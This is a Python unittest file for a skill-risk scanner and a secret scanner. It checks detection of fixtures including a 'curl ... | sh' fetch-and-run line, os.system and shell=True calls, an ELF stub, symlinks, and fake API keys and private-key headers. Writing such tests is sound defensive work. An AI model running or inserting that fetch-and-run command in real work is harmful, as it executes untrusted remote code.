import os
import tempfile
import unittest

from _helpers import RISK_SCAN, SECRET_SCAN, load_module

risk = load_module("scan_skill_risk", RISK_SCAN)
secrets = load_module("scan_secrets", SECRET_SCAN)


def _write(root: str, rel: str, content: str) -> None:
    full = os.path.join(root, rel)
    os.makedirs(os.path.dirname(full), exist_ok=True)
    with open(full, "w", encoding="utf-8") as fh:
        fh.write(content)


class SkillRiskTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.root = self._tmp.name

    def tearDown(self):
        self._tmp.cleanup()

    def test_pipe_remote_to_shell_is_high(self):
        _write(self.root, "install.md", "Run: curl http://example.test/x.sh | sh\n")
        f = risk.scan_path(self.root)
        self.assertTrue(any(x.severity == "HIGH" and x.rule == "pipe-remote-to-shell" for x in f))

    def test_os_system_and_shell_true_are_medium(self):
        _write(self.root, "tool.py", "import os, subprocess\nos.system('ls')\nsubprocess.run('ls', shell=True)\n")
        rules = {x.rule for x in risk.scan_path(self.root) if x.severity == "MEDIUM"}
        self.assertIn("os-system", rules)
        self.assertIn("shell-true-subprocess", rules)

    def test_clean_directory_has_no_high(self):
        _write(self.root, "SKILL.md", "# Bersih\nTidak ada perintah berbahaya.\n")
        self.assertFalse(any(x.severity == "HIGH" for x in risk.scan_path(self.root)))

    def test_elf_binary_is_high(self):
        with open(os.path.join(self.root, "payload.bin"), "wb") as fh:
            fh.write(b"\x7fELF\x02\x01\x01\x00")
        self.assertTrue(any(x.rule == "compiled-binary" for x in risk.scan_path(self.root)))

    def test_symlink_is_high(self):
        target = os.path.join(self.root, "real.txt")
        _write(self.root, "real.txt", "x")
        os.symlink(target, os.path.join(self.root, "link"))
        self.assertTrue(any(x.rule == "symlink" for x in risk.scan_path(self.root)))

    def test_invalid_path_raises(self):
        with self.assertRaises(ValueError):
            risk.scan_path(os.path.join(self.root, "missing"))


class SecretScanTests(unittest.TestCase):
    def test_google_key_detected_and_masked(self):
        key = "AIza" + "A" * 35
        findings = secrets.scan_text("app.dart", f"const k = '{key}';\n")
        self.assertEqual([f.rule for f in findings], ["google-api-key"])
        self.assertNotIn(key, findings[0].preview)

    def test_private_key_block_detected(self):
        findings = secrets.scan_text("id_rsa", "-----BEGIN RSA PRIVATE KEY-----\n")
        self.assertEqual(findings[0].rule, "private-key-block")

    def test_placeholder_ignored(self):
        self.assertEqual(secrets.scan_text("cfg.dart", "const password = 'your_password_here_123';\n"), [])

    def test_generic_secret_detected(self):
        findings = secrets.scan_text("cfg.dart", "const api_key = 'abcdef123456789xyz';\n")
        self.assertEqual(findings[0].rule, "generic-assignment")
        self.assertNotIn("abcdef123456789xyz", findings[0].preview)

    def test_mask_short_value(self):
        self.assertEqual(secrets.mask("abc"), "***")

    def test_directory_scan_skips_git_dir(self):
        with tempfile.TemporaryDirectory() as root:
            _write(root, ".git/config", "token = 'abcdef123456789xyz'\n")
            _write(root, "src/a.dart", "void main() {}\n")
            self.assertEqual(secrets.scan_directory(root), [])


if __name__ == "__main__":
    unittest.main()
